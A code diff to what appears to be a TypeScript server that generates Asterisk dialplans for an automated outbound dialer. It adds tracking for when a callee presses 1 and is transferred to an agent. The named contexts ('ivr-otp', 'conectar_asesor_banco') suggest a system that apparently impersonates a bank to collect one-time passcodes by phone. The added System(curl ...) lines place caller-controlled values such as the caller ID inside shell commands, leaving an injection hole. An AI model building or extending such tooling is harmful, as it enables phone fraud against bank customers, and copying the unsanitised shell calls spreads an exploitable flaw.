@@ -144,9 +144,15 @@ function sendAmiAction(host = '127.0.0.1', port = 5038, user = 'sammy', secret =
 export interface CallState {
   number: string;
   channel?: string;
-  status: 'dialing' | 'ringing' | 'in_ivr' | 'machine' | 'ended' | 'transferred';
+  status: 'dialing' | 'ringing' | 'in_ivr' | 'pressed_1' | 'machine' | 'ended' | 'transferred';
+  digit?: string;
   cause?: string;
+  agent?: string;
   timestamp: number;
+  startTime?: number;
+  answeredAt?: number;
+  pressed1At?: number;
+  duration?: number;
 }
 
 const callStatusStore = new Map<string, CallState>();
@@ -1785,6 +1791,9 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=in_ivr)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=in_ivr&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,UserEvent(CallAnswered,Number=\${TARGET_DEST},Context=ivr-press1,Channel=\${CHANNEL})\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR-PRESS1] ESPERANDO 1.5 SEGUNDOS DE PAUSA NATURAL ANTES DEL AUDIO ===)\n`;
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
@@ -1802,9 +1811,14 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,WaitExten(4)\n`;
   dialplanContent += ` same => n,Goto(menu)\n\n`;
 
-  dialplanContent += `; CUANDO EL CLIENTE PRESIONA 1: ESPERA 2 SEGUNDOS DE PAUSA NATURAL Y LUEGO MENSAJE DE TRANSFERENCIA AL ASESOR\n`;
-  dialplanContent += `exten => 1,1,NoOp(=== [IVR-PRESS1] DIGITO 1 DETECTADO -> ESPERANDO 2 SEGUNDOS DE PAUSA NATURAL ===)\n`;
-  dialplanContent += ` same => n,Wait(2)\n`;
+  dialplanContent += `; CUANDO EL CLIENTE PRESIONA 1: NOTIFICACION INMEDIATA AL PANEL Y TRANSFERENCIA AL ASESOR\n`;
+  dialplanContent += `exten => 1,1,NoOp(=== [IVR-PRESS1] DIGITO 1 DETECTADO -> CLIENTE PRESIONO 1 ===)\n`;
+  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=pressed_1)\n`;
+  dialplanContent += ` same => n,Set(DB(call_digit/\${TARGET_NUM})=1)\n`;
+  dialplanContent += ` same => n,UserEvent(Press1Detected,Number=\${TARGET_NUM},Digit=1,Channel=\${CHANNEL})\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=pressed_1&digit=1&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
@@ -1819,6 +1833,8 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(last_agent_call/\${TARGET_DEST})=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=transferred)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=transferred&agent=\${FINAL_AGENT}&channel=\${CHANNEL}" &)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -1835,6 +1851,9 @@ function generateCleanDialplanConf(
   dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=in_ivr)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=in_ivr&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,UserEvent(CallAnswered,Number=\${TARGET_DEST},Context=ivr-otp,Channel=\${CHANNEL})\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR-OTP] ESPERANDO 1.5 SEGUNDOS DE PAUSA NATURAL ANTES DEL AUDIO ===)\n`;
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
@@ -1953,8 +1972,13 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Playback(beep)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
-  dialplanContent += `exten => 1,1,NoOp(=== [IVR] PRESS 1 DETECTADO -> ESPERANDO 2 SEGUNDOS DE PAUSA NATURAL ===)\n`;
-  dialplanContent += ` same => n,Wait(2)\n`;
+  dialplanContent += `exten => 1,1,NoOp(=== [IVR] PRESS 1 DETECTADO -> NOTIFICANDO PANEL Y ASESOR ===)\n`;
+  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=pressed_1)\n`;
+  dialplanContent += ` same => n,Set(DB(call_digit/\${TARGET_NUM})=1)\n`;
+  dialplanContent += ` same => n,UserEvent(Press1Detected,Number=\${TARGET_NUM},Digit=1,Channel=\${CHANNEL})\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=pressed_1&digit=1&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
@@ -1969,6 +1993,8 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(last_agent_call/\${TARGET_DEST})=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=transferred)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=transferred&agent=\${FINAL_AGENT}&channel=\${CHANNEL}" &)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -4217,33 +4243,90 @@ app.get('/api/asterisk/live/channels', async (req, res) => {
 app.get('/api/asterisk/call/status', (req, res) => {
   const number = String(req.query.number || '').trim().replace(/[^0-9]/g, '');
   if (!number) {
-    return res.json({ success: true, calls: Array.from(callStatusStore.values()) });
+    const list = Array.from(callStatusStore.values()).map((c) => {
+      const isAlive = c.status !== 'ended' && c.status !== 'machine';
+      const liveDuration = isAlive
+        ? Math.max(0, Math.floor((Date.now() - (c.answeredAt || c.startTime || c.timestamp)) / 1000))
+        : (c.duration || 0);
+      return { ...c, duration: liveDuration };
+    });
+    return res.json({ success: true, calls: list });
   }
   const clean10 = number.length === 11 && number.startsWith('1') ? number.substring(1) : number;
   const state = callStatusStore.get(number) || callStatusStore.get(clean10) || callStatusStore.get(`1${clean10}`);
-  res.json({ success: true, call: state || null });
+  if (state) {
+    const isAlive = state.status !== 'ended' && state.status !== 'machine';
+    const liveDuration = isAlive
+      ? Math.max(0, Math.floor((Date.now() - (state.answeredAt || state.startTime || state.timestamp)) / 1000))
+      : (state.duration || 0);
+    return res.json({ success: true, call: { ...state, duration: liveDuration } });
+  }
+  res.json({ success: true, call: null });
 });
 
-// Real-time status update from dialplan (e.g. hangup 'h' or AMD answering machine detected)
+// Endpoint to get the currently running active call across all tabs
+app.get('/api/asterisk/call/latest-active', (req, res) => {
+  const allCalls = Array.from(callStatusStore.values());
+  const active = allCalls.reverse().find(
+    (c) => c.status !== 'ended' && c.status !== 'machine' && Date.now() - c.timestamp < 1800000
+  );
+  if (active) {
+    const liveDuration = Math.max(
+      0,
+      Math.floor((Date.now() - (active.answeredAt || active.startTime || active.timestamp)) / 1000)
+    );
+    return res.json({ success: true, call: { ...active, duration: liveDuration } });
+  }
+  res.json({ success: true, call: null });
+});
+
+// Real-time status update from dialplan (e.g. press 1, answered, transfer, hangup 'h' or AMD answering machine detected)
 app.all('/api/asterisk/call/status/update', (req, res) => {
   const number = String(req.query.number || req.body?.number || '').trim().replace(/[^0-9]/g, '');
   const status = String(req.query.status || req.body?.status || 'ended').trim();
   const cause = String(req.query.cause || req.body?.cause || '').trim();
   const channel = String(req.query.channel || req.body?.channel || '').trim();
+  const digit = String(req.query.digit || req.body?.digit || '').trim();
+  const agent = String(req.query.agent || req.body?.agent || '').trim();
 
   if (number) {
     const clean10 = number.length === 11 && number.startsWith('1') ? number.substring(1) : number;
+    const existing =
+      callStatusStore.get(number) || callStatusStore.get(clean10) || callStatusStore.get(`1${clean10}`);
+
+    const startTime = existing?.startTime || Date.now();
+    let answeredAt = existing?.answeredAt;
+    let pressed1At = existing?.pressed1At;
+
+    if ((status === 'in_ivr' || status === 'ringing' || status === 'pressed_1') && !answeredAt) {
+      answeredAt = Date.now();
+    }
+    if (status === 'pressed_1' || digit === '1') {
+      pressed1At = Date.now();
+    }
+
+    const duration = Math.max(0, Math.floor((Date.now() - (answeredAt || startTime)) / 1000));
+
     const callState: CallState = {
       number,
-      channel,
+      channel: channel || existing?.channel || '',
       status: status as any,
-      cause,
+      cause: cause || existing?.cause,
+      agent: agent || existing?.agent,
+      digit: digit || existing?.digit || (status === 'pressed_1' ? '1' : undefined),
       timestamp: Date.now(),
+      startTime,
+      answeredAt,
+      pressed1At,
+      duration,
     };
+
     callStatusStore.set(number, callState);
     callStatusStore.set(clean10, callState);
     callStatusStore.set(`1${clean10}`, callState);
-    console.log(`[CALL STATUS NOTIFIER] Destino ${number} -> Estado: ${status} (Causa: ${cause}, Canal: ${channel})`);
+    console.log(
+      `[CALL STATUS NOTIFIER] Destino ${number} -> Estado: ${status} (Causa: ${cause || 'N/A'}, Dígito: ${digit || callState.digit || 'ninguno'}, Canal: ${channel})`
+    );
   }
   res.json({ success: true });
 });
